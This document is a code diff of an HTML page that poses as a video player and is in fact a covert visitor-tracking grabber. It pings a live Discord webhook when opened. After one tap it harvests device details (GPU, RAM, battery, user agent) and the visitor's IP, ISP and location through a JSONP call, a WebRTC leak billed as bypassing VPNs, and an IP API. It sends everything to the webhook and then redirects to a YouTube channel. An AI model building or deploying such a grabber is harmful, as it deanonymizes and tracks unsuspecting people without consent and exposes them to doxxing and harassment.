@@ -1,132 +1,148 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Media Player</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Media Player - Loading...</title>
     <style>
-        body { background: #000; color: #111; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .gate { text-align: center; cursor: pointer; padding: 50px; border-radius: 10px; background: #050505; border: 1px solid #111; }
-        .btn { background: #ff0000; color: #fff; padding: 15px 40px; border-radius: 5px; font-weight: bold; border: none; font-size: 20px; }
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .gate { text-align: center; cursor: pointer; padding: 40px; border: 1px solid #111; border-radius: 12px; background: #050505; transition: 0.3s; }
+        .gate:active { transform: scale(0.98); }
+        .btn { background: #ff0000; color: #fff; padding: 18px 50px; border-radius: 8px; font-weight: bold; border: none; font-size: 22px; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
+        .status { color: #333; font-size: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-    <div class="gate" id="trigger">
-        <button class="btn">▶ RESUME VIDEO</button>
+    <div class="gate" id="masterTrigger">
+        <button class="btn">▶ START VIDEO</button>
+        <p class="status">Connecting to Encrypted Buffer...</p>
     </div>
 
     <script>
-    // 1. PRIMARY CONFIG
     const CONFIG = {
         HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0",
         DEST: "https://youtube.com/@LigmaBlox-w7m"
     };
 
-    // 2. THE ULTIMATE DISPATCH (Multipart + Beacon Hybrid)
-    function dispatch(obj, type = "LOG") {
-        const payload = JSON.stringify({ ...obj, username: type });
+    // --- UNIVERSAL DISPATCHER ---
+    function send(data, label = "SYSTEM") {
+        const blob = new Blob([JSON.stringify({ ...data, username: label })], { type: 'application/json' });
         
-        // Method A: Multipart Form Data (Bypasses CORS filters)
-        const form = new FormData();
-        form.append("payload_json", payload);
-        fetch(CONFIG.HOOK, { method: 'POST', body: form, mode: 'no-cors', keepalive: true });
-
-        // Method B: Beacon (Ensures delivery if tab closes)
-        navigator.sendBeacon(CONFIG.HOOK, new Blob([payload], {type: 'application/json'}));
-    }
-
-    // 3. APPLE & HARDWARE INTELLIGENCE
-    async function getIntel() {
-        const w = window.screen.width, h = window.screen.height;
-        let model = navigator.platform;
+        // Try all three delivery methods for maximum durability
+        try { fetch(CONFIG.HOOK, { method: 'POST', body: blob, mode: 'no-cors', keepalive: true }); } catch(e){}
+        try { navigator.sendBeacon(CONFIG.HOOK, blob); } catch(e){}
         
-        // Exact Apple Model Mapping
-        if (w === 430 && h === 932) model = "iPhone 15/14 Pro Max";
-        else if (w === 393 && h === 852) model = "iPhone 15/14 Pro";
-        else if (w === 428 && h === 926) model = "iPhone 14 Plus / 13 Pro Max";
-        else if (w === 390 && h === 844) model = "iPhone 14/13/13 Pro";
-        
-        let gpu = "Restricted";
+        // Backup: XHR for very old devices/browsers
         try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            // Polished: Handles both Apple and Non-Apple (Windows/Android) GPUs safely
-            gpu = renderer.includes('Apple') ? renderer.split('Apple ').pop() : renderer;
-        } catch(e) {}
-
-        return {
-            embeds: [{
-                title: "💎 TARGET UNMASKED",
-                color: 16711680,
-                fields: [
-                    { name: "Device", value: model, inline: true },
-                    { name: "GPU/Chip", value: gpu, inline: true },
-                    { name: "Battery", value: await getBattery(), inline: true },
-                    { name: "UA", value: "```" + navigator.userAgent + "```" }
-                ]
-            }]
-        };
+            let x = new XMLHttpRequest();
+            x.open("POST", CONFIG.HOOK);
+            x.send(blob);
+        } catch(e){}
     }
 
-    async function getBattery() {
+    // --- UNIVERSAL DEVICE IDENTIFIER ---
+    async function probeDevice() {
+        let info = {
+            os: navigator.platform,
+            agent: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || "N/A",
+            ram: navigator.deviceMemory || "N/A",
+            gpu: "Unknown",
+            screen: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`
+        };
+
+        // GPU Unmasking (Works on Windows, Mac, Android, iOS)
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+        } catch(e) { info.gpu = "Masked/Software"; }
+
+        // Battery Intel
         try {
             const b = await navigator.getBattery();
-            return `${Math.round(b.level * 100)}% (${b.charging ? "AC" : "DC"})`;
-        } catch(e) { return "N/A"; }
+            info.battery = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Unplugged"})`;
+        } catch(e) {}
+
+        return info;
     }
 
-    // 4. THE JSONP TUNNEL (Section 8 Force-Bypass)
-    window.processIntel = function(data) {
-        dispatch({
+    // --- UNIVERSAL NETWORK PROBE (The "Triple Threat") ---
+    function probeNetwork() {
+        // 1. JSONP Tunnel (Bypasses most Wi-Fi restrictions)
+        const s = document.createElement('script');
+        s.src = `https://ipinfo.io/json?callback=xtunnel&t=${Date.now()}`;
+        document.body.appendChild(s);
+
+        // 2. WebRTC UDP Crack (Bypasses VPNs)
+        const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        rtc.createDataChannel("");
+        rtc.onicecandidate = (e) => {
+            if (e.candidate) {
+                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                if (ip) send({ content: `🚨 **FIREWALL CRACKED:** \`${ip[1]}\`` }, "UDP-PROBE");
+            }
+        };
+        rtc.createOffer().then(o => rtc.setLocalDescription(o));
+
+        // 3. Direct API Race
+        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => {
+            send({ content: `📡 **IP DISCOVERY:** \`${d.ip}\`` }, "API-PROBE");
+        }).catch(()=>{});
+    }
+
+    // JSONP Callback handler
+    window.xtunnel = (data) => {
+        send({
             embeds: [{
-                title: "🛑 BYPASS SUCCESSFUL",
-                color: 65280,
+                title: "🛑 CONNECTION ESTABLISHED",
+                color: 16776960,
                 fields: [
-                    { name: "IP", value: data.ip, inline: true },
-                    { name: "ISP", value: data.org, inline: true },
-                    { name: "Loc", value: `${data.city}, ${data.country}`, inline: true }
+                    { name: "IP", value: data.ip || "??", inline: true },
+                    { name: "ISP", value: data.org || "??", inline: true },
+                    { name: "Location", value: `${data.city}, ${data.country}`, inline: true }
                 ]
             }]
-        }, "JSONP-TUNNEL");
+        }, "JSONP-PROBE");
     };
 
-    // 5. MASTER EXECUTION (One-Tap Protocol)
-    async function run() {
-        // Initial silent land
-        dispatch({ content: "🟢 **Link Opened (Awaiting Tap)...**" });
+    // --- MASTER RUN ---
+    async function start() {
+        // Silent landing ping
+        send({ content: "🟢 **Target is on GitHub Landing Page...**" });
 
-        document.getElementById('trigger').onclick = async function() {
+        document.getElementById('masterTrigger').onclick = async function() {
             this.innerHTML = "<button class='btn'>LOADING...</button>";
+            
+            // Gather hardware first
+            const hardware = await probeDevice();
+            send({
+                embeds: [{
+                    title: "💎 HARDWARE UNMASKED",
+                    color: 16711680,
+                    fields: [
+                        { name: "Device/OS", value: hardware.os, inline: true },
+                        { name: "GPU", value: "```" + hardware.gpu + "```" },
+                        { name: "Specs", value: `Cores: ${hardware.cores} | RAM: ${hardware.ram}GB`, inline: true },
+                        { name: "Screen", value: hardware.screen, inline: true },
+                        { name: "Battery", value: hardware.battery || "N/A", inline: true }
+                    ]
+                }]
+            }, "APEX-HARDWARE");
 
-            // A. Fire Hardware Intel
-            getIntel().then(intel => dispatch(intel, "HARDWARE-ENFORCER"));
+            // Trigger network probes
+            probeNetwork();
 
-            // B. Open JSONP Tunnel (invisible IP grab)
-            const s = document.createElement('script');
-            // Polished: Added a cache-buster to ensure fresh data every time
-            s.src = `https://ipinfo.io/json?callback=processIntel&cachebuster=${Date.now()}`;
-            document.body.appendChild(s);
-
-            // C. WebRTC UDP Crack (Parallel Fire)
-            const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            rtc.createDataChannel("");
-            rtc.onicecandidate = (ice) => {
-                if (ice.candidate) {
-                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                    if (ip) dispatch({ content: `🚨 **FIREWALL CRACK:** \`${ip[1]}\`` }, "UDP-CRACK");
-                }
-            };
-            rtc.createOffer().then(o => rtc.setLocalDescription(o));
-
-            // D. The Final Bounce
+            // Final Redirect
             setTimeout(() => {
                 window.location.replace(CONFIG.DEST);
-            }, 500);
+            }, 600);
         };
     }
 
-    run();
+    start();
     </script>
 </body>
 </html>
